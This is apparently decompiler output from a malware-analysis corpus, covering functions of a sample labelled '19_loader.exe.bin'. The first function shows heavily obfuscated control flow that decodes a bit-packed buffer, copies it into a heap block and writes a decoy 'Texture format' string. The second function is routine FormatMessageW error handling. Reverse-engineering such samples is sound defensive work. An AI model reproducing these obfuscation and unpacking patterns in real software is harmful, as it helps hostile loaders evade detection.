                  uVar28 = (uVar44 - uVar28 & -(ulonglong)bVar49) + uVar28;
                  uVar45 = (uint)((pbVar27[uVar38] >> uVar29 & 1) != 0);
                    /* WARNING: Switch is manually overridden */
                  switch(*puVar30) {
                  case 0x25c:
                    uVar32 = uVar32 | uVar45;
                    puVar30 = (undefined4 *)&UNK_14008b24c;
                    bVar49 = iVar35 == 0;
                    iVar35 = iVar35 + -1;
                    if (bVar49) {
                      puVar30 = (undefined4 *)&UNK_14008b258;
                    }
                    /* WARNING: Switch is manually overridden */
                    switch(*puVar30) {
                    case 0xfffffc6c:
                      goto override_jmp_140002979_case_0;
                    }
                    break;
                  case 0x696:
                    uVar32 = uVar32 | uVar45;
                    puVar30 = (undefined4 *)&UNK_14008b24c;
                    bVar49 = iVar35 == 0;
                    iVar35 = iVar35 + -1;
                    if (bVar49) {
                      puVar30 = (undefined4 *)&UNK_14008b258;
                    }
                    uVar44 = uVar38;
                    /* WARNING: Switch is manually overridden */
                    switch(*puVar30) {
                    case 0xfffffc6c:
                      goto override_jmp_140002979_case_0;
                    }
                  }
override_jmp_140002979_case_1:
                  uStack_440 = uVar32 + uStack_440;
                  lVar39 = 0x58;
                  if (uVar32 < 0xbd88977b - uVar33) {
                    lVar39 = 0x40;
                  }
                    /* WARNING: Switch is manually overridden */
                  switch(*(undefined4 *)(&UNK_14008b1a8 + lVar39)) {
                  case 0xfffffd5f:
                    uVar32 = 0;
                    puVar30 = (undefined4 *)&UNK_14008b280;
                    if (uVar28 < uStack_4b0) {
                      puVar30 = (undefined4 *)&UNK_14008b2cc;
                    }
                    break;
                  case 0xffffffa4:
                    goto override_jmp_140002c0c_case_1;
                  }
                  iVar35 = 7;
                  uVar44 = uVar28;
                  uVar38 = uVar28;
                    /* WARNING: Switch is manually overridden */
                  switch(*puVar30) {
                  case 0xfffffe48:
                    goto override_jmp_140002793_case_0;
                  }
                } while( true );
              }
            } while( true );
          }
          uStack_440 = (ulonglong)uVar32 + 3;
                    /* WARNING: Switch is manually overridden */
override_jmp_140002c0c_case_1:
          lVar39 = 0x6c;
          if (uVar48 < uStack_480) {
            lVar39 = 0x30;
          }
          break;
        case 0xfffffcf3:
          do {
            iVar35 = iVar35 + -1;
            lVar39 = 0x18;
            if (uVar44 < uStack_4b0) {
              lVar39 = 0xd0;
            }
                    /* WARNING: Switch is manually overridden */
            switch(*(undefined4 *)(&UNK_14008b1a8 + lVar39)) {
            case 0x154:
override_jmp_14000281e_case_1:
              uVar48 = uVar48 * 2;
              lVar39 = 0x10;
                    /* WARNING: Switch is manually overridden */
              if (iVar35 == 0) {
                lVar39 = 0x38;
              }
                    /* WARNING: Switch is manually overridden */
              switch(*(undefined4 *)(&UNK_14008b1a8 + lVar39)) {
              case 0x865:
                goto override_jmp_140003a24_case_1;
              }
              break;
            case 0xfffffe0e:
              goto override_jmp_14000281e_case_0;
            }
          } while( true );
        }
                    /* WARNING: Switch is manually overridden */
        switch(*(undefined4 *)(&UNK_14008b1a8 + lVar39)) {
        case 0x666:
          lVar39 = ~(ulonglong)uVar48 + uStack_480;
          uVar44 = uVar37 - uStack_480;
          if (uStack_440 < uVar37 - uStack_480) {
            uVar44 = uStack_440;
          }
          lVar36 = 0xc;
          if (uVar44 == 0) {
            lVar36 = 0x118;
          }
          uVar38 = 0;
                    /* WARNING: Switch is manually overridden */
          switch(*(undefined4 *)(&UNK_14008b1a8 + lVar36)) {
          case 0x10ef:
override_jmp_1400031a6_case_1:
            do {
              uVar42 = lVar39 + uVar38;
                    /* WARNING: Switch is manually overridden */
              switch(uStack_480 <= uVar42) {
              case false:
                uVar38 = uVar38 + 1;
                uVar3 = *(undefined1 *)((longlong)local_300 + uVar42);
                lVar36 = 0x134;
                if (uStack_480 == uStack_2f8) {
                  lVar36 = 0x88;
                }
                break;
              case true:
                goto override_jmp_140002ea4_case_1;
              }
                    /* WARNING: Switch is manually overridden */
              switch(*(undefined4 *)(&UNK_14008b1a8 + lVar36)) {
              case 0xf94:
                FUN_1400012c4(&local_300);
                *(undefined1 *)((longlong)local_300 + uStack_480) = uVar3;
                uStack_480 = uStack_480 + 1;
                lVar36 = 0xc;
                if (uVar38 == uVar44) {
                  lVar36 = 0x118;
                }
                local_498 = local_300;
                uStack_2f0 = uStack_480;
                    /* WARNING: Switch is manually overridden */
                switch(*(undefined4 *)(&UNK_14008b1a8 + lVar36)) {
                case 0xfffffeb3:
                  goto override_jmp_1400031a6_case_0;
                }
                goto override_jmp_1400031a6_case_1;
              case 0x12f4:
                *(undefined1 *)((longlong)local_300 + uStack_480) = uVar3;
                uStack_480 = uStack_480 + 1;
                lVar36 = 0xc;
                if (uVar38 == uVar44) {
                  lVar36 = 0x118;
                }
              }
              local_498 = local_300;
              uStack_2f0 = uStack_480;
                    /* WARNING: Switch is manually overridden */
              switch(*(undefined4 *)(&UNK_14008b1a8 + lVar36)) {
              case 0xfffffeb3:
                goto override_jmp_1400031a6_case_0;
              }
            } while( true );
          case 0xfffffeb3:
override_jmp_1400031a6_case_0:
            puVar30 = (undefined4 *)&UNK_14008b214;
            if (uStack_480 < uVar37) {
              puVar30 = (undefined4 *)&UNK_14008b28c;
            }
          }
          break;
        case 0x6ff:
          goto override_jmp_1400029f4_case_1;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*puVar30) {
        case 0x6ff:
          goto override_jmp_1400029f4_case_1;
        }
      }
    } while( true );
  }
override_jmp_1400029f4_case_1:
  uVar28 = uStack_2f8;
  puVar26 = local_300;
  uVar44 = ~_DAT_1400df478;
  FUN_140001280(pbVar27,uVar34,1,1);
  uStack_3c8 = 0;
  uStack_3c0 = 0;
  uStack_3b9 = 0;
  uStack_3b8 = 0;
  local_388[0] = 0;
  local_388[1] = 0;
  local_388[2] = 0;
  local_388[3] = 0;
  local_388[4] = 0;
  local_388[5] = 0;
  local_388[6] = 0;
  local_388[7] = 0;
  local_388[8] = 0;
  local_388[9] = 0;
  local_388[10] = 0;
  local_388[0xb] = 0;
  local_388[0xc] = 0;
  local_388[0xd] = 0;
  local_388[0xe] = 0;
  local_388[0xf] = 0;
  local_388[0x10] = 0;
  local_388[0x11] = 0;
  local_388[0x12] = 0;
  local_388[0x13] = 0;
  local_388[0x14] = 0;
  local_388[0x15] = 0;
  local_388[0x16] = 0;
  local_388[0x17] = 0;
  local_388[0x18] = 0;
  local_388[0x19] = 0;
  local_388[0x1a] = 0;
  local_388[0x1b] = 0;
  local_388[0x1c] = 0;
  local_388[0x1d] = 0;
  local_388[0x1e] = 0;
  local_388[0x1f] = 0;
  local_388[0x20] = 0;
  local_388[0x21] = 0;
  local_388[0x22] = 0;
  local_388[0x23] = 0;
  local_388[0x24] = 0;
  local_388[0x25] = 0;
  local_388[0x26] = 0;
  local_388[0x27] = 0;
  local_388[0x28] = 0;
  local_388[0x29] = 0;
  local_388[0x2a] = 0;
  local_388[0x2b] = 0;
  local_388[0x2c] = 0;
  local_388[0x2d] = 0;
  local_388[0x2e] = 0;
  local_388[0x2f] = 0;
  local_388[0x30] = 0;
  local_388[0x31] = 0;
  local_388[0x32] = 0;
  local_388[0x33] = 0;
  local_388[0x34] = 0;
  local_388[0x35] = 0;
  local_388[0x36] = 0;
  local_388[0x37] = 0;
  local_388[0x38] = 0;
  local_388[0x39] = 0;
  puVar30 = (undefined4 *)&UNK_14008b2d8;
  if (uStack_480 == uVar44 + 0xc7e594afc7e12ab) {
    puVar30 = (undefined4 *)&UNK_14008b2c4;
  }
  local_388[0x3a] = 0;
  local_388[0x3b] = 0;
  local_388[0x3c] = 0;
  local_388[0x3d] = 0;
  local_388[0x3e] = 0;
  local_388[0x3f] = 0;
  local_388[0x40] = 0;
  local_388[0x41] = 0;
  local_388[0x42] = 0;
  local_388[0x43] = 0;
  local_388[0x44] = 0;
  local_388[0x45] = 0;
  local_388[0x46] = 0;
  local_388[0x47] = 0;
  local_388[0x48] = 0;
  local_388[0x49] = 0;
                    /* WARNING: Switch is manually overridden */
  switch(*puVar30) {
  case 0x953:
    uVar3 = *(undefined1 *)(puVar26 + 1);
    uVar15 = *puVar26;
    uStack_3c8 = *(undefined8 *)((longlong)puVar26 + 0x11);
    uStack_3c0 = (undefined7)*(undefined8 *)((longlong)puVar26 + 0x19);
    uStack_3b9 = (undefined1)puVar26[4];
    uStack_3b8 = (undefined7)((ulonglong)puVar26[4] >> 8);
    uVar44 = (ulonglong)(uVar33 ^ 0xbd88964c);
    uVar10 = *(undefined4 *)((longlong)puVar26 + uVar44);
    uVar4 = *(undefined1 *)((longlong)puVar26 + uVar44 + 4);
    lVar39 = *(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8);
    uVar34 = (ulonglong)
             (byte)(((byte)*(undefined8 *)(lVar39 + 0xc0) ^ (char)(uVar33 ^ 0xbd88964c) + 0x25U) +
                   0x2f);
    uVar11 = *(undefined4 *)((longlong)puVar26 + uVar34);
    uVar5 = *(undefined1 *)((longlong)puVar26 + uVar34 + 4);
    FUN_140021f30((undefined8 *)local_388,(undefined8 *)((longlong)puVar26 + 0x4a),0x4a);
    uVar6 = *(undefined1 *)((longlong)puVar26 + 0xc2);
    uStack_338 = uStack_3c8;
    uStack_330 = uStack_3c0;
    uStack_329 = uStack_3b9;
    uStack_328 = uStack_3b8;
    FUN_140021f30((undefined8 *)local_140,(undefined8 *)local_388,0x4a);
    puVar25 = (undefined8 *)((longlong)puVar26 + (ulonglong)(uVar33 ^ 0xbd8896e0));
    uStack_318 = *puVar25;
    uStack_310 = puVar25[1];
    uVar7 = *(undefined2 *)((longlong)puVar26 + 0xbc);
    uVar16 = *(undefined8 *)((longlong)puVar26 + 0xb4);
    FUN_140021f30(&local_300,(undefined8 *)((longlong)puVar26 + 199),0x60);
    pbStack_408 = *(byte **)((longlong)puVar26 + 299);
    uStack_400 = *(ulonglong *)((longlong)puVar26 + 0x133);
    uStack_3f8 = *(ulonglong *)((longlong)puVar26 + 0x13b);
    uStack_3e2 = *(undefined8 *)((longlong)puVar26 + 0x151);
    uStack_3f0 = (undefined6)*(undefined8 *)((longlong)puVar26 + 0x143);
    uStack_3ea = (undefined2)*(undefined8 *)((longlong)puVar26 + 0x149);
    uStack_3e8 = (undefined6)((ulonglong)*(undefined8 *)((longlong)puVar26 + 0x149) >> 0x10);
    FUN_140001280(puVar26,uVar28,1,1);
    uVar17 = *(undefined8 *)(local_3d0 + 0xe);
    uVar18 = *(undefined8 *)(local_3d0 + 2);
    uVar19 = *(undefined8 *)(local_3d0 + 10);
    uVar12 = *local_3d0;
    uVar20 = *(undefined8 *)
              ((longlong)local_3d0 + ((-0x31bbb2af939e782d - *(longlong *)(lVar39 + 0x30)) - uVar44)
              );
    puVar26 = FUN_14000fc7a(0,0x30);
                    /* WARNING: Switch is manually overridden */
    switch((puVar26 != (undefined8 *)0x0) * '\x02') {
    case '\0':
override_jmp_140002d6c_case_1:
                    /* WARNING: Does not return */
      pcVar21 = (code *)invalidInstructionException();
      (*pcVar21)();
    case '\x02':
      puVar26[4] = 0x652065676e617220;
      puVar26[5] = 0x6e6f69736e657478;
      puVar26[2] = 0x707075732073656f;
      puVar26[3] = 0x435645482074726f;
      *puVar26 = 0x2065727574786554;
      puVar26[1] = 0x642074616d726f66;
      uVar8 = local_3d0[4];
      uVar13 = *(undefined8 *)(local_3d0 + 6);
      uVar14 = *(undefined8 *)(local_3d0 + 0xc);
      uVar9 = local_3d0[0x10];
      puVar25 = FUN_14000fc7a(0,0x159);
      puVar30 = (undefined4 *)&UNK_14008b294;
      if (puVar25 == (undefined8 *)0x0) {
        puVar30 = (undefined4 *)&UNK_14008b27c;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar30) {
      case 0xc9c:
        *(undefined1 *)(puVar25 + 1) = uVar3;
        *puVar25 = uVar15;
        uVar32 = uVar33 + 0x4277698d;
        *(undefined8 *)((longlong)puVar25 + (ulonglong)uVar32) = uVar19;
        *(undefined8 *)((longlong)puVar25 + 0x11) = uStack_338;
        *(ulonglong *)((longlong)puVar25 + 0x19) = CONCAT17(uStack_329,uStack_330);
        puVar25[4] = CONCAT71(uStack_328,uStack_329);
        *(undefined8 *)((longlong)puVar25 + (ulonglong)(0x31 - uVar32)) = uVar18;
        *(undefined4 *)(puVar25 + 6) = uVar10;
        *(undefined1 *)((longlong)puVar25 + 0x34) = uVar4;
        *(undefined8 *)((longlong)puVar25 + 0x35) = uVar20;
        *(undefined4 *)((longlong)puVar25 + 0x3d) = uVar11;
        *(undefined1 *)((longlong)puVar25 + 0x41) = uVar5;
        *(undefined8 *)((longlong)puVar25 + 0x42) = uVar14;
        uVar28 = -local_390;
        FUN_140021f30((undefined8 *)((longlong)puVar25 + ~(~uVar28 ^ 0x5d63123d1cc3037b)),
                      (undefined8 *)local_140,0x4a);
        *(undefined8 *)((longlong)puVar25 + 0x94) = uVar13;
        puVar1 = (undefined8 *)((longlong)puVar25 + (ulonglong)(uVar33 + 0x42776a20));
        *puVar1 = uStack_318;
        puVar1[1] = uStack_310;
        *(undefined8 *)((longlong)puVar25 + 0xac) = uVar17;
        lVar39 = (local_3a0 - (ulonglong)uVar32) + ~(~uVar28 ^ 0x5d63123d1cc3037b);
        *(undefined8 *)((longlong)puVar25 + lVar39) = uVar16;
        *(undefined2 *)((longlong)puVar25 + lVar39 + 8) = uVar7;
        *(undefined4 *)((longlong)puVar25 + 0xbe) = uVar8;
        *(undefined1 *)((longlong)puVar25 + 0xc2) = uVar6;
        *(undefined4 *)((longlong)puVar25 + (ulonglong)(0xcc - uVar32)) = uVar9;
        FUN_140021f30((undefined8 *)
                      ((ulonglong)
                       (((uint)*(undefined8 *)
                                (*(longlong *)
                                  ((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8)
                                + 0x70) ^ 0x913c396) + 0xdb3ee9b0 + (0x31 - uVar32)) +
                      (longlong)puVar25),&local_300,0x60);
        *(undefined4 *)((longlong)puVar25 + 0x127) = uVar12;
        uVar28 = (ulonglong)(uVar32 ^ 0x122);
        *(undefined8 *)((longlong)puVar25 + uVar28) = pbStack_408;
        ((undefined8 *)((longlong)puVar25 + uVar28))[1] = uStack_400;
        puVar2 = (ulonglong *)((longlong)puVar25 + uVar28 + 0x10);
        *puVar2 = uStack_3f8;
        puVar2[1] = CONCAT26(uStack_3ea,uStack_3f0);
        puVar1 = (undefined8 *)((longlong)puVar25 + uVar28 + 0x1e);
        *puVar1 = CONCAT62(uStack_3e8,uStack_3ea);
        puVar1[1] = uStack_3e2;
        *local_3a8 = puVar25;
        *(undefined8 *)((longlong)local_3a8 + (ulonglong)(uVar32 ^ 1)) = 0x159;
        *(undefined8 *)((longlong)local_3a8 + (ulonglong)(0x19 - uVar32)) = 0x159;
        FUN_140001280(puVar26,(((ulonglong)(local_398 * 0x5a5126cce825d441) >> 5 |
                               local_398 * 0x5a5126cce825d441 << 0x3b) - (ulonglong)(uVar32 ^ 1)) +
                              (ulonglong)(uVar33 + 0x42776a20),1,1);
        return;
      }
override_jmp_140002ea4_case_1:
                    /* WARNING: Does not return */
      pcVar21 = (code *)invalidInstructionException();
      (*pcVar21)();
    }
  }
  goto override_jmp_1400032c2_case_1;
override_jmp_140002802_case_1:
                    /* WARNING: Switch is manually overridden */
  switch(*(undefined4 *)(&UNK_14008a7a4 + (longlong)(int)((uVar48 == 0) + 1) * 4)) {
  case 0xfff78c25:
                    /* WARNING: Switch is manually overridden */
    break;
  case 0xfff78efd:
    uVar37 = (ulonglong)uVar48;
                    /* WARNING: Switch is manually overridden */
    uVar44 = 0x4000000;
    if (uVar37 < 0x4000000) {
      uVar44 = uVar37;
    }
    FUN_140002164(&local_300,uVar44,0,1,1);
    puVar30 = (undefined4 *)&UNK_14008b228;
    if ((char)local_300 != '\0') {
      puVar30 = (undefined4 *)&UNK_14008b2b8;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar30) {
    case 0x59f:
      bVar22 = (byte)iVar41;
      bVar47 = (bVar47 ^ bVar22) + ~((DAT_1400dfc00 + bVar22) * '\x05');
      local_498 = *(undefined8 **)((longlong)&local_300 + (ulonglong)bVar47);
      uStack_2f8 = uStack_2f0;
      puVar30 = (undefined4 *)&UNK_14008b2a4;
      if ((byte)(bVar31 & 1) == (byte)(8 - bVar47)) {
        puVar30 = (undefined4 *)&UNK_14008b218;
      }
      uStack_2f0 = 0;
      local_300 = local_498;
                    /* WARNING: Switch is manually overridden */
      switch(*puVar30) {
      case 0xfffffd3a:
        uVar44 = uVar28;
                    /* WARNING: Switch is manually overridden */
        switch(uVar48 == 0x7e69434f - ~_DAT_1400dfbc8) {
        case false:
          lVar39 = 0x3f;
          if (uVar37 - 1 != 0) {
            for (; uVar37 - 1 >> lVar39 == 0; lVar39 = lVar39 + -1) {
            }
          }
          uVar48 = (int)lVar39 + 1;
          uVar32 = 4;
          if (4 < uVar48) {
            uVar32 = uVar48;
          }
          uVar48 = 0xe;
          if (uVar32 < 0xe) {
            uVar48 = uVar32;
          }
          iStack_444 = uVar48 - 1;
          uStack_480 = 0;
                    /* WARNING: Switch is manually overridden */
          switch(uStack_4b0 <= uVar28) {
          case true:
            goto override_jmp_140002cd5_case_1;
          }
          break;
        case true:
          iStack_444 = 3;
          uStack_480 = 0;
                    /* WARNING: Switch is manually overridden */
          switch(uStack_4b0 <= uVar28) {
          case true:
            goto override_jmp_140002cd5_case_1;
          }
        }
override_jmp_140002cd5_case_0:
        lVar39 = 0x34;
        if ((pbVar27[uVar28] >> ((uVar33 ^ 0xbd88967b) & uVar46 & 0x1f) & 1) == 0) {
          lVar39 = 0x68;
        }
        uVar46 = uVar46 + 1;
        bVar31 = 0;
        bVar49 = uVar46 == 8;
        if (bVar49) {
          uVar46 = 0;
        }
        uVar44 = bVar49 + uVar28;
        iVar35 = 0;
        uVar28 = uVar44;
                    /* WARNING: Switch is manually overridden */
        switch(*(undefined4 *)(&UNK_14008b1a8 + lVar39)) {
        case 0xbaf:
          goto override_jmp_140002cd5_case_1;
        }
override_jmp_140002bba_case_0:
        do {
                    /* WARNING: Switch is manually overridden */
          switch(uStack_4b0 <= uVar44) {
          case false:
            iVar35 = iVar35 + 1;
            bVar31 = (pbVar27[uVar44] >> (uVar33 + 0x4277698b & uVar46 & 0x1f) & 1) != 0 |
                     bVar31 * '\x02';
            uVar46 = uVar46 + 1;
                    /* WARNING: Switch is manually overridden */
            if (uVar46 == 8) {
              uVar46 = 0;
              uVar28 = uVar44 + 1;
              uVar44 = uVar44 + 1;
            }
            puVar30 = (undefined4 *)&UNK_14008b1dc;
            if (iVar35 == -0x4277697c - uVar33) {
              puVar30 = (undefined4 *)&UNK_14008b264;
            }
                    /* WARNING: Switch is manually overridden */
            switch(*puVar30) {
            case 0xffffff7c:
              goto override_jmp_140002bba_case_1;
            }
            goto override_jmp_140002bba_case_0;
          case true:
            bVar31 = bVar31 * '\x02';
            iVar35 = iVar35 + 1;
            puVar30 = (undefined4 *)&UNK_14008b1dc;
                    /* WARNING: Switch is manually overridden */
            if (iVar35 == -0x4277697c - uVar33) {
              puVar30 = (undefined4 *)&UNK_14008b264;
            }
          }
                    /* WARNING: Switch is manually overridden */
          switch(*puVar30) {
          case 0xffffff7c:
            goto override_jmp_140002bba_case_1;
          }
        } while( true );
      }
override_jmp_140002be2_case_0:
      do {
        uVar44 = uStack_2f0;
        bVar31 = 0;
        iVar35 = 1;
        lVar39 = 0x54;
        if (uVar28 < uStack_4b0) {
          lVar39 = 0xa8;
        }
        uVar38 = uVar28;
        uVar32 = uVar46;
                    /* WARNING: Switch is manually overridden */
        switch(*(undefined4 *)(&UNK_14008b1a8 + lVar39)) {
        case 0x4e2:
          goto override_jmp_14000305b_case_1;
        }
override_jmp_14000305b_case_0:
        iVar41 = uVar46 + 1;
        bVar49 = iVar41 == ~(_DAT_1400dfbd4 + 0xc714ab2eU ^ 0xbd8ae9c3) * -0x39900f1b;
        uVar32 = (-iVar41 & -(uint)bVar49) + iVar41;
        uVar42 = -(ulonglong)bVar49;
        uVar28 = ((uVar38 + 1) - uVar28 & uVar42) + uVar28;
        bVar31 = (pbVar27[uVar38] >> (uVar46 & 7) & 1) != 0 | bVar31;
        uVar38 = ((uVar38 + 1) - uVar38 & uVar42) + uVar38;
        lVar39 = 0x2c;
        if (iVar35 == uVar33 + 0x4277698c) {
          lVar39 = 0xf8;
        }
        uVar46 = uVar32;
                    /* WARNING: Switch is manually overridden */
        switch(*(undefined4 *)(&UNK_14008b1a8 + lVar39)) {
        case 0x6d1:
          do {
            iVar35 = iVar35 + 1;
            bVar31 = bVar31 * '\x02';
            lVar39 = 0x54;
            if (uVar38 < uStack_4b0) {
              lVar39 = 0xa8;
            }
                    /* WARNING: Switch is manually overridden */
            switch(*(undefined4 *)(&UNK_14008b1a8 + lVar39)) {
            case 0x445:
              goto override_jmp_14000305b_case_0;
            case 0x4e2:
override_jmp_14000305b_case_1:
              lVar39 = 0x2c;
              if (iVar35 == uVar33 + 0x4277698c) {
                lVar39 = 0xf8;
              }
                    /* WARNING: Switch is manually overridden */
              switch(*(undefined4 *)(&UNK_14008b1a8 + lVar39)) {
              case 0xfffffca5:
                goto override_jmp_140002ff2_case_0;
              }
            }
          } while( true );
        case 0xfffffca5:
override_jmp_140002ff2_case_0:
          uVar46 = uVar32;
          uStack_480 = uStack_2f0 + 1;
          lVar39 = 0x50;
          if (uStack_2f0 == uStack_2f8) {
            lVar39 = 0xcc;
          }
        }
                    /* WARNING: Switch is manually overridden */
        switch(*(undefined4 *)(&UNK_14008b1a8 + lVar39)) {
        case 0xaa:
          *(byte *)((longlong)local_498 + uStack_2f0) = bVar31;
          uStack_2f0 = uStack_480;
                    /* WARNING: Switch is manually overridden */
          switch(uStack_480 != uVar37) {
          case false:
            goto override_jmp_1400029f4_case_1;
          }
          goto override_jmp_140002be2_case_0;
        }
        FUN_1400012c4(&local_300);
        *(byte *)((longlong)local_300 + uVar44) = bVar31;
        local_498 = local_300;
        uStack_2f0 = uStack_480;
                    /* WARNING: Switch is manually overridden */
        switch(uStack_480 != uVar37) {
        case false:
          goto override_jmp_1400029f4_case_1;
        }
      } while( true );
    }
    goto override_jmp_140002d6c_case_1;
  }
override_jmp_14000307b_case_1:
  FUN_140001280(pbVar27,uStack_400,1,1);
  uStack_3c8 = 0;
  uStack_3c0 = 0;
  uStack_3b9 = 0;
  uStack_3b8 = 0;
  local_388[0] = 0;
  local_388[1] = 0;
  local_388[2] = 0;
  local_388[3] = 0;
  local_388[4] = 0;
  local_388[5] = 0;
  local_388[6] = 0;
  local_388[7] = 0;
  local_388[8] = 0;
  local_388[9] = 0;
  local_388[10] = 0;
  local_388[0xb] = 0;
  local_388[0xc] = 0;
  local_388[0xd] = 0;
  local_388[0xe] = 0;
  local_388[0xf] = 0;
  local_388[0x10] = 0;
  local_388[0x11] = 0;
  local_388[0x12] = 0;
  local_388[0x13] = 0;
  local_388[0x14] = 0;
  local_388[0x15] = 0;
  local_388[0x16] = 0;
  local_388[0x17] = 0;
  local_388[0x18] = 0;
  local_388[0x19] = 0;
  local_388[0x1a] = 0;
  local_388[0x1b] = 0;
  local_388[0x1c] = 0;
  local_388[0x1d] = 0;
  local_388[0x1e] = 0;
  local_388[0x1f] = 0;
  local_388[0x20] = 0;
  local_388[0x21] = 0;
  local_388[0x22] = 0;
  local_388[0x23] = 0;
  local_388[0x24] = 0;
  local_388[0x25] = 0;
  local_388[0x26] = 0;
  local_388[0x27] = 0;
  local_388[0x28] = 0;
  local_388[0x29] = 0;
  local_388[0x2a] = 0;
  local_388[0x2b] = 0;
  local_388[0x2c] = 0;
  local_388[0x2d] = 0;
  local_388[0x2e] = 0;
  local_388[0x2f] = 0;
  local_388[0x30] = 0;
  local_388[0x31] = 0;
  local_388[0x32] = 0;
  local_388[0x33] = 0;
  local_388[0x34] = 0;
  local_388[0x35] = 0;
  local_388[0x36] = 0;
  local_388[0x37] = 0;
  local_388[0x38] = 0;
  local_388[0x39] = 0;
  local_388[0x3a] = 0;
  local_388[0x3b] = 0;
  local_388[0x3c] = 0;
  local_388[0x3d] = 0;
  local_388[0x3e] = 0;
  local_388[0x3f] = 0;
  local_388[0x40] = 0;
  local_388[0x41] = 0;
  local_388[0x42] = 0;
  local_388[0x43] = 0;
  local_388[0x44] = 0;
  local_388[0x45] = 0;
  local_388[0x46] = 0;
  local_388[0x47] = 0;
  local_388[0x48] = 0;
  local_388[0x49] = 0;
                    /* WARNING: Switch is manually overridden */
override_jmp_1400032c2_case_1:
                    /* WARNING: Does not return */
  pcVar21 = (code *)invalidInstructionException();
  (*pcVar21)();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x3e81 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140003e81 rva=0x3e81 */

ulonglong FUN_140003e81(uint param_1,longlong param_2)

{
  undefined1 (*pauVar1) [32];
  ushort uVar2;
  ushort uVar3;
  code *pcVar4;
  byte bVar5;
  DWORD DVar6;
  uint uVar7;
  longlong lVar8;
  HMODULE lpSource;
  byte bVar9;
  undefined8 uVar10;
  undefined1 *puVar11;
  longlong lVar12;
  ulonglong uVar13;
  undefined1 (*pauVar14) [32];
  ushort *puVar15;
  bool bVar16;
  LPVOID pvVar17;
  byte bVar18;
  undefined1 uStack0000000000000048;
  undefined8 uStack_48;
  
  uStack_48 = 0x140003e97;
  lVar8 = FUN_140013c00();
  lVar8 = -lVar8;
  *(uint *)((longlong)register0x00000020 + lVar8) = param_1;
  pauVar14 = (undefined1 (*) [32])(&uStack0000000000000048 + lVar8);
  lpSource = (HMODULE)0x0;
  *(undefined8 *)((longlong)&uStack_48 + lVar8) = 0x140003ebe;
  FUN_1400225e0(pauVar14,0,0x1000);
  DVar6 = 0x1200;
  puVar11 = (undefined1 *)((longlong)register0x00000020 + lVar8 + -0x40);
  if ((param_1 >> 0x1c & 1) != 0) {
    *(undefined8 *)((longlong)&uStack_48 + lVar8) = 0x140003ed6;
    lpSource = GetModuleHandleW(L"NTDLL.DLL");
    puVar11 = (undefined1 *)((longlong)register0x00000020 + lVar8 + -0x40);
    if (lpSource == (HMODULE)0x0) {
      lpSource = (HMODULE)0x0;
    }
    else {
      param_1 = param_1 & 0xefffffff;
      *(uint *)((longlong)register0x00000020 + lVar8) = param_1;
      DVar6 = 0x1a00;
      puVar11 = (undefined1 *)((longlong)register0x00000020 + lVar8 + -0x40);
    }
  }
  *(undefined1 (**) [32])(puVar11 + 0x20) = pauVar14;
  *(undefined8 *)(puVar11 + 0x30) = 0;
  *(undefined4 *)(puVar11 + 0x28) = 0x800;
  *(undefined8 *)(puVar11 + -8) = 0x140003f1a;
  DVar6 = FormatMessageW(DVar6,lpSource,param_1,0,*(LPWSTR *)(puVar11 + 0x20),
                         *(DWORD *)(puVar11 + 0x28),*(va_list **)(puVar11 + 0x30));
  if (DVar6 != 0) {
    if (DVar6 < 0x801) {
      *(undefined8 *)(puVar11 + 0x20) = 1;
      *(undefined8 *)(puVar11 + -8) = 0x140003f54;
      FUN_140002164((undefined8 *)(puVar11 + 0x70),(ulonglong)DVar6,0,1,
                    *(ulonglong *)(puVar11 + 0x20));
      pauVar1 = (undefined1 (*) [32])(puVar11 + (ulonglong)DVar6 * 2 + 0x88);
      if (puVar11[0x70] == '\0') {
        *(longlong *)(puVar11 + 0x68) = param_2;
        pvVar17 = *(LPVOID *)(puVar11 + 0x78);
        *(LPVOID *)(puVar11 + 0x48) = pvVar17;
        *(undefined8 *)(puVar11 + 0x50) = *(undefined8 *)(puVar11 + 0x80);
        lVar8 = 0;
        bVar16 = false;
        do {
          *(longlong *)(puVar11 + 0x58) = lVar8;
          if (!bVar16) {
            if (pauVar1 != pauVar14) {
              uVar2 = *(ushort *)*pauVar14;
              pauVar14 = (undefined1 (*) [32])(*pauVar14 + 2);
              goto LAB_140003feb;
            }
LAB_14000418b:
            lVar12 = *(longlong *)(puVar11 + 0x50);
            if (lVar12 == -1) goto LAB_140004208;
            goto joined_r0x00014000419e;
          }
          uVar2 = *(ushort *)(puVar11 + 0x46);
LAB_140003feb:
          uVar7 = (uint)uVar2;
          if ((uVar7 & 0xf800) == 0xd800) {
            if (uVar7 < 0xdc00) {
              if (pauVar14 == pauVar1) {
                uVar13 = (ulonglong)uVar2 * 0x10000 + 1;
                bVar16 = false;
                pauVar14 = pauVar1;
              }
              else {
                uVar3 = *(ushort *)*pauVar14;
                pauVar14 = (undefined1 (*) [32])(*pauVar14 + 2);
                if (0xfbff < (ushort)(uVar3 + 0x2000)) {
                  uVar13 = ((ulonglong)(uVar7 & 0x3ff) << 0x2a) + 0x1000000000000 |
                           (ulonglong)(uVar3 & 0x3ff) << 0x20;
                  goto LAB_14000407a;
                }
                bVar16 = true;
                uVar13 = (ulonglong)uVar2 * 0x10000 + 1;
                *(ushort *)(puVar11 + 0x46) = uVar3;
              }
            }
            else {
              uVar13 = (ulonglong)uVar2 * 0x10000 + 1;
LAB_14000407a:
              bVar16 = false;
            }
          }
          else {
            uVar13 = (ulonglong)uVar7 << 0x20;
            bVar16 = false;
          }
          if ((short)uVar13 == 2) goto LAB_14000418b;
          if ((uVar13 & 1) != 0) goto LAB_1400041ef;
          bVar5 = (byte)(uVar13 >> 0x20);
          if (uVar13 >> 0x27 == 0) {
            lVar12 = 1;
            *(undefined8 *)(puVar11 + -8) = 0x140004134;
            FUN_1400125b9((undefined8 *)(puVar11 + 0x48),1);
            pvVar17 = *(LPVOID *)(puVar11 + 0x48);
            *(byte *)((longlong)pvVar17 + lVar8) = bVar5;
          }
          else if (uVar13 >> 0x2b == 0) {
            lVar12 = 2;
            *(undefined8 *)(puVar11 + -8) = 0x14000416b;
            FUN_1400125b9((undefined8 *)(puVar11 + 0x48),2);
